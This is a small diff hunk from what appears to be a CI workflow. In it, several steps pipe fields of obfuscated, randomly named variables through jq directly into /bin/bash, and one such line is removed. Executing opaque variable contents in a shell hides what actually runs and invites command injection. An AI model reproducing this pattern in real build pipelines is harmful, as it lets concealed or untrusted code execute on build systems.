@@ -23,7 +23,6 @@ jobs:
           echo $pkdmk6 | jq -r .pdnn48 | /bin/bash
           echo $xhede44933 | jq -r .jwu616 | /bin/bash
           printf '%s' "$vcuy38" | jq -r .r504 | /bin/bash
-          echo $peveh91001 | jq -r .uzrih1448 | /bin/bash
           echo $ty491 | jq -r .rzda39162 | /bin/bash
 
       - name: Save archive
